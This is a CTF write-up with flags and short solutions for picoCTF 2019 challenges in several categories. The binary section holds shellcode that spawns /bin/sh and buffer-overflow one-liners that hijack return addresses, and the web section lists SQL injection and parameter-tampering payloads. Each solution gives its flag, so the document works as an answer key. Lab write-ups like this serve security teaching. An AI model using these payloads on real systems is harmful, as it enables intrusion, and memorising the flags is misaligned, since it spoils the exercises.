Here are the flags and solutions for some of the challenges of picoCTF 2019


# General
***

In general category i haven't put all the solutions.

## What's the difference:- 
We can use compare `cmp` cmd  

>cmd:- <p> cmp -bl file1.jgp file2.jpg

`picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}`






---
# Binary Exploitation
---

## practice-run-1

`picoCTF{g3t_r3adY_2_r3v3r53}`


## handy-shellcode :-  
shellcode for executing `/bin/sh` from [shell-storm](http://shell-storm.org/shellcode/files/shellcode-811.php)
 ```
 (echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\n"; cat) | ./vuln
```
`picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}`


## OverFlow0 :- 
>cmd:-  <p> ./vuln \`python -c 'print "a"*133'\`

`picoCTF{3asY_P3a5y4a888b8e}`


## OverFlow1 :-  
[reference]( https://0xrick.github.io/binary-exploitation/bof3/)

check the functions (objdump -d ./vuln or inside gdb using 'info functions'). There is function named 'flag' take its address and call it at the end of buffer. 
>cmd:-	 <p>     python -c "print 'A'x76+ '\xe6\x85\x04\x08'" | ./vuln

`picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}`


## OverFlow2 :-
```
 python -c "import struct;print 'A' * 188 + struct.pack('<I', 0x080485e6) + '\x00'*4 + struct.pack('<I', 0xDEADBEEF) + struct.pack('<I', 0xC0DED00D)" | ./overflow2
```
`picoCTF{arg5_and_r3turn5ce5cf61a}`



## NewOverFlow1 :- 
Here binary is of 64bit so we have to put 8 bytes and on shell server increase one byte for flag() address[replace: 0x0000000000400767-->0x0000000000400768]
>cmd:- <p> python -c "import struct;print('A'*72 + struct.pack('I',0x0000000000400768) ) "| ./newoverflow2

`picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_d0b837aa}`



## NewOverFlow2 :- 
Binary is 64bit, on shell server increse one byte for flag() address [replace: 0x000000000040084d --> 0x000000000040084e]
>cmd:-  <p>   python -c "import struct;print('A'*72 + struct.pack('I',0x000000000040084d) )"| ./newoverflow2

`picoCTF{r0p_1t_d0nT_st0p_1t_e51a1ea0}`









---
# Forensics
---

## Glory of the Garden :- 
>cmd:-  <p> cat		[OR]  hexdump -C garden.jpg |grep -A 4 -B 2 CTF

`picoCTF{more_than_m33ts_the_3y3f089EdF0}`


## unzip

`picoCTF{unz1pp1ng_1s_3a5y}`


## so meta :- 
> cmd:- <p>  cat [OR]  hexdump -C pico_img.png  |grep -A 3 pico

`picoCTF{s0_m3ta_ffd09c0f}`


## extensions :- 
`file` cmd

`picoCTF{now_you_know_about_extensions}`


## shark on wire 1 :-  
src=10.0.0.2, dst=10.0.0.12, Length=60, No.=63

`picoCTF{StaT31355_636f6e6e}`


## like1000 :- 
File named tar_opener.py

`picoCTF{l0t5_0f_TAR5}`


## What-lies-within :- 
zsteg tool	[OR]  	[stegnography online](https://stylesuxx.github.io/steganography/)

`picoCTF{h1d1ng_1n_th3_b1t5}`


shark on wire 2 :- NOT DONE

picoCTF{StaT31355e







---
# Crytography  
---


## The Numbers :- 
letters with their sequence numbers

`picoCTF{THENUMBERSMASON}`


## Easy1:- 
Vernam Cipher OR Vigenere Cipher [ciphertext=UFJKXQZQUNB , key=SOLVECRYPTO]

`picoCTF{CRYPTOISFUN}`

## 13 :- 
rot13

`picoCTF{not_too_bad_of_a_problem}`


## caeser :- caeser cipher

`pico{crossingtherubicongysimakx}`


## la cifra de
[vigenerae cipher](https://guballa.de/vigenere-solver)

`picoCTF{b311a50_0r_v1gn3r3_c1ph3r1119c336}`


## Flags :- 
nautical flag alphabet

`PICOCTF{F1AG5AND5TUFF}`

## Mr-Worldwide:- 
get location using cordinates and flag is the first letters of the city

`picoCTF{KODIAK_ALASKA}`


## Tapping:- 
morse code

`PICOCTF{M0RS3C0D31SFUN3960854397}`


## rsa-pop-quiz:- 	
> https://the-rsa-tron.koorkevani.repl.co/  
> [ n=pxq , totient(n)=(p-1)x(q-1) , create ciphertext using python ="pow(plaintext,e,N)" ]
 finally convert plaintext/numbers [14311663942709674867122208214901970650496788151239520971623411712977120619528460123336291453] to hex using python=  "hex(number)" 
 > then hex to ascii online https://www.rapidtables.com/convert/number/hex-to-ascii.html
```
`picoCTF{wA8_th4t$_ill3aGal..of4878474}`



## waves over lambda :-    
example:- [iywbelgp fzez hp cyne xtlb - xezanzwic_hp_i_ymze_tlsvul_xuhhhenvel]    https://quipqiup.com/

`picoCTF{frequency_is_c_over_lambda_fdiiirubra}`





---
# WEB Exploitation
---
[Refrence](https://github.com/qihaoooooo/picoCTF-2019/blob/master/web.md)


## Insp3ct0r :- 
check all source code pages

`picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?e85ef63c}`


## dont-use-client-side :-  
check source code

`picoCTF{no_clients_plz_90ff34}`


## logon :- 
intercapt the request and change username=admin and admin=True for each request

`picoCTF{th3_c0nsp1r4cy_l1v3s_6679fcb5}`


## Where are the robots :- 
robots.txt

`picoCTF{ca1cu1at1ng_Mach1n3s_0ecd0}`


## Client-side-again :- 
source code, check 'var 0x5a46' and guess the flag

`picoCTF{not_this_again_d29871}`


## picobrowser :-

`picoCTF{p1c0_s3cr3t_ag3nt_3e1c0ea2}`


## open-to-admins :-  
Add new parameters while requesting /flag page [ ;admin=True;time=1400]

`picoCTF{0p3n_t0_adm1n5_cc661e91}`


## Irish-Name-Repo 1 :-  
[' or 1=1 -- ] /  [admin' -- ]   

`picoCTF{s0m3_SQL_1fe77718}`


## Irish-Name-Repo 2 :-  
[ admin' -- ]

`picoCTF{m0R3_SQL_plz_752d1173}`


## Irish-Name-Repo 3 :- 
intercept using burpsuit, passwd is encrypted using rot13 [rot13 of ' or 1=1 --  ==> ' BE 1=1 -- ]

`picoCTF{3v3n_m0r3_SQL_a9766759}`




---
# Reverse Engineering
---

## vault-door-training

`picoCTF{w4rm1ng_Up_w1tH_jAv4_fcb79c48f5b}`


## vault-door1

`picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_63ef3a}`


## vault-door3

`picoCTF{jU5t_a_s1mpl3_an4gr4m_4_u_5baf7c}`


## vault-door4

`picoCTF{jU5t_4_bUnCh_0f_bYt3s_80f8e1e047}`


## vault-door5 :-
base64 decode --> url decode

`picoCTF{c0nv3rt1ng_fr0m_ba5e_64_c14cce11}`

